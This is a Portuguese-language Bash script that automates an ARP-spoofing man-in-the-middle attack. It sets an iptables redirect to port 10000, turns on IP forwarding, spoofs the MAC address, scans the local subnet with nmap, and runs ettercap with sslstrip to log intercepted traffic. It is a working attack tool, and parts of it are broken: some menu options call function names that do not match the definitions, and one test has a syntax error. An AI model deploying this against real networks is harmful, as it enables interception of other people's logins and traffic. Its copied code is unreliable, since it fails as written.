# Script de ARP-Spoof utilizando sslstrip e ettercap
# 
# Data: 2016/05/04
# Autor: Joao Lucas 
# Github: https://github.com/joao-lucas
#

function menu() {

# Variáveis de ambiente
DATA=`date | cut -d ' ' -f 5`
PREFIX='/home/joao_lucas/Área\ de\ trabalho/Capturas'
ARQUIVO=capMiTMv2-$DATA.log
 
 
        clear
        echo "###############Data: `date`###################"
        echo "Diretório da captura: $PREFIX"
        echo "Arquivo da captura: $ARQUIVO"
        echo "####################################################################"
        echo "1. Listar placas de rede"
        echo "2. Ver regras do iptables"
        echo "3. Limpar regras do iptables"
        echo "4. Iniciar regras"
        echo "5. Mudar macaddress" 
        echo "6. Identificas hosts"
        echo "7. Iniciar snnifer"
        echo "99. Sair"
        read -p "> Escolha: " opt

        case $opt in
                1) listarPlacasdeRede ;;
                2) verRegrasdoIptables ;;
                3) limparRegrasIptables ;;
                4) iniciarRegras ;;
                5) mudarMacAddress ;;
                6) identificarHosts ;;
                7) iniciarSnnifer ;;
                99) echo "Saindo..."; sleep 1; exit ;;
                *) echo "Opção invalida!" ; sleep 2;  menu ;;
        esac
}      

# opção 1
function listarPlacasdeRede() {
        ifconfig -a | less 
        menu
}

# opção 2
function verRegrasdoIptables {
        iptables -t nat -L
        if [ $? -eq 0 ]
        then
                echo "[ OK ] Comando executado com sucesso."
                sleep 2
        else
                echo "[ FALHA ] Ocorreu erros na listagem das regras!"
                sleep 2
        fi
        menu
        
}

# opção 3
function limparRegrasdoIptables() {
        iptables -t nat -F
        if [ $? -eq 0]
        then
                echo "[ OK ] Comando executado com sucesso."
                sleep 2
        else
                echo "[ FALHA ] Não foi possivel limpar as regras!"
                sleep 2
        fi
        sleep 2
        menu
}

# opção 4
function iniciarRegras() {
        echo "~> Criando regras no iptables..."
        sleep 2
        iptables -t nat -F
        iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000        
        if [ $? -eq 0 ]
        then
                echo "[ OK ] Regras no iptables criada." 
                echo "~> Ativando ip_forward..." 
                echo 1 > /proc/sys/net/ipv4/ip_forward
                if [ $? -eq 0 ]
                then
                        echo "[ OK ] Ip_forward ativado."
                        sleep 2
                else
                        echo "[ FALHA ] Ocorreu erros em ativar o ip_forward! " 
                        sleep 2
                fi                  
        else
               echo "[ FALHA ] Ocorreu erros em criar regras!"
               sleep 2
       fi
        
       menu  
}
 
# opção 5
function mudarMacAddress() {
        macchanger -r wlp2s0
        if [ $? -eq 0 ]
        then
                echo "[ OK ] Macaddress mudado com sucesso."
                sleep 2
        else
                echo "[ FALHA ] Ocorreu erros na alteração do macaddress!"
                sleep 2
        fi

        menu
}

function identificarHosts() {
        nmap -Pn -T 3 192.168.1.0/24 | tee $PREFIX/mitm_hosts.txt && egrep '([0-9]{1,3}\.){3}[0-9]{1,3}' $PREFIX/mitm_hosts.txt | awk '{print $5}'
        if [ $? -eq 0 ]
        then
                echo "[ OK ] Voltando ao menu."
                sleep 2
        else
                echo "[ FALHA ] Ocorreram erros!"
                sleep 2
        fi

        sleep 2
        menu
}

function iniciarSniffer() {
        # salvando em ...
        ettercap -G &
 
        killall -TERM sslstrip
        xfce4-terminal -e sslstrip -w $PREFIX/$ARQUIVO
        tail -f $PREFIX/$ARQUIVO | tee mitm_output.txt
}

while true
do
        menu
done
